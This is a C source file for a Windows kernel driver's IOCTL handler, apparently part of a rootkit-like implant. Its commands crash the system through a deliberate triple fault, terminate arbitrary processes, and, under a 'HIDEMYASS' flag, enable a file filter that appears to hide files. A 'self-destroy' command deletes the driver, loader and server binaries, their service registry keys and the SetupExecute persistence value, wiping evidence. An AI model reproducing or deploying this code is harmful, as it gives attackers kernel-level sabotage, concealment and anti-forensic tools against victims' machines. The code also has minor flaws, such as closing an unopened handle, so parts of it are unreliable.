#include "Driver.h"

extern PDEVICE_OBJECT g_pDeviceObject;
extern PFLT_FILTER g_pFltFileFilter;
extern BOOLEAN g_FiltersEnabled;



NTSTATUS IhIOCTLHandler(PDEVICE_OBJECT deviceObject, PIRP pIrp) {

	IoSetCancelRoutine(pIrp, NULL);

	NTSTATUS status = STATUS_SUCCESS;

	
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(pIrp);

	ULONG IOCTLCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

	DBGINFO("Recieved IOCTL 0x%03X", FUNCTION_FROM_CTL_CODE(IOCTLCode));


	switch (IOCTLCode)

	{

	case IOCTL_FIRMWAREPOWER:
	{	
		HalReturnToFirmware(*(PFIRMWARE_REENTRY)pIrp->AssociatedIrp.SystemBuffer);
	}

	break;


	case IOCTL_TRIPLE_FAULT:
	{
		IDT zeroIdt = { 0 };

		LoadIDT(&zeroIdt);

		// Death
		IntEight();
	}

	break;


	case IOCTL_TERMINATEPROCESS:
	{
		ULONG PIDToTerminate = *(ULONG*)pIrp->AssociatedIrp.SystemBuffer;

		status = UTerminateProcessByPid(PIDToTerminate);

	}
	
	break;

#if HIDEMYASS

	case IOCTL_INITIALIZE_FILTERING:
	{
		DBGINFO("Initializing filtering...");
		
		NT_ASSERT(g_pDeviceObject != NULL);

		if (g_FiltersEnabled)
		{
			status = STATUS_ALREADY_INITIALIZED;

			break;
		}

		status = InitializeFiltering(g_pDeviceObject->DriverObject, &g_pFltFileFilter);

		if (!NT_SUCCESS(status))
		{
			DBGERROR("Fiter initialization failed with ntstatus %08X", status);

			break;
		}

		g_FiltersEnabled = TRUE;

		DBGINFO("Filter initialization succeeded");

	}

	break;

#endif

	case IOCTL_SELFDESTROY:
	{
		DBGINFO("Self-destroying...");

		PCWSTR filesToDelete[] =
		{
			WIDE_DRIVER_IMAGE_PATH,
			WIDE_DRIVER_LOADER_IMAGE_PATH,
			WIDE_SERVER_IMAGE_PATH
		};

		PCWSTR keysToDelete[] =
		{
			L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\"WIDE_DRIVER_NAME L"\\Instances\\Instance1",
			L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\"WIDE_DRIVER_NAME L"\\Instances",
			L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\"WIDE_DRIVER_NAME
		};

#if HIDEMYASS

		// Disable the filters if any are enabled
		if (g_FiltersEnabled)
		{
			status = UninitializeFiltering(g_pFltFileFilter);

			if (!NT_SUCCESS(status))
			{
				DBGERRORNTSTATUS("UninitializeFiltering", status);

				break;
			}
		}

#endif

		// Delete all binaries
		for (int i = 0; i < ARRAYSIZE(filesToDelete); i++)
		{
			status = UForceDeleteFile(filesToDelete[i]);
			
			if (!NT_SUCCESS(status))
			{
				DBGERROR("Failed to delete file %d (ntstatus 0x%08)", i, status);

				goto _IhIOCTLHandler_IoComplete;
			}

		}
		

		// Delete all service keys
		for (int i = 0; i < ARRAYSIZE(keysToDelete); i++)
		{
			HANDLE hKey;
			UNICODE_STRING keyPath;
			OBJECT_ATTRIBUTES keyObjAttribs;

			RtlInitUnicodeString(&keyPath, keysToDelete[i]);

			InitializeObjectAttributes(&keyObjAttribs, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

			status = ZwOpenKey(&hKey, DELETE, &keyObjAttribs);

			if (!NT_SUCCESS(status))
			{
				DBGERRORNTSTATUS("ZwOpenKey", status);

				ZwClose(hKey);
				
				goto _IhIOCTLHandler_IoComplete;
			}

			status = ZwDeleteKey(hKey);

			if (!NT_SUCCESS(status))
			{
				DBGERRORNTSTATUS("ZwDeleteKey", status);

				ZwClose(hKey);
				
				goto _IhIOCTLHandler_IoComplete;
			}

			ZwClose(hKey);
		}

		// Delete the Driver loader SetupExecute entry (for now we just delete SetupExecute completely)

		HANDLE sessionMgrKeyHandle;
		UNICODE_STRING sessionMgrKeyName;
		UNICODE_STRING sessionMgrValueName;
		OBJECT_ATTRIBUTES sessionMgrKeyObjAttribs;

		RtlInitUnicodeString(&sessionMgrKeyName, L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager");
		RtlInitUnicodeString(&sessionMgrValueName, L"SetupExecute");
		
		InitializeObjectAttributes(&sessionMgrKeyObjAttribs, &sessionMgrKeyName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

		status = ZwOpenKey(&sessionMgrKeyHandle, KEY_SET_VALUE, &sessionMgrKeyObjAttribs);

		if (!NT_SUCCESS(status))
		{
			DBGERRORNTSTATUS("ZwOpenKey", status);

			break;
		}

		status = ZwDeleteValueKey(sessionMgrKeyHandle, &sessionMgrValueName);

		if (!NT_SUCCESS(status))
		{
			DBGERRORNTSTATUS("ZwDeleteValueKey", status);
		}

		ZwClose(sessionMgrKeyHandle);

	}
	break;

#ifdef DEBUG
	case IOCTL_DEBUGTEST:
	{
		// Debugging stuff
	}
	break;
#endif

	default:

		status = STATUS_INVALID_DEVICE_REQUEST;

		break;
	}

	_IhIOCTLHandler_IoComplete:
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return status;
}


